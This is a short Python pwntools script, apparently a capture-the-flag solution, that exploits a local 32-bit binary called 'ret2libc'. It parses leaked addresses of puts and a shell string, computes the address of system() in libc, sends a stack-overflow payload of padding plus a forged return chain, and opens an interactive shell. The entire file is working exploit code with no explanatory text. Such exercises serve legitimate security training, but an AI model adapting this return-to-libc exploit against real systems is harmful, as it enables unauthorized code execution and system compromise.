from pwn import *

ret2libc = ELF('./ret2libc')
sh = process('./ret2libc')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

system_offset = libc.symbols['system']
puts_offset = libc.symbols['puts']

sh.recvuntil(b'is ')
sh_addr = int(sh.recvuntil(b'\n', drop=True), 16)
print(hex(sh_addr))

sh.recvuntil(b'is ')
puts_addr = int(sh.recvuntil(b'\n', drop=True), 16)
print(hex(puts_addr))

system_addr = puts_addr - puts_offset + system_offset

payload = flat([b'a' * 28, 0xdeadbeef, system_addr, 0xdeadbeef, sh_addr])

sh.sendline(payload)
sh.interactive()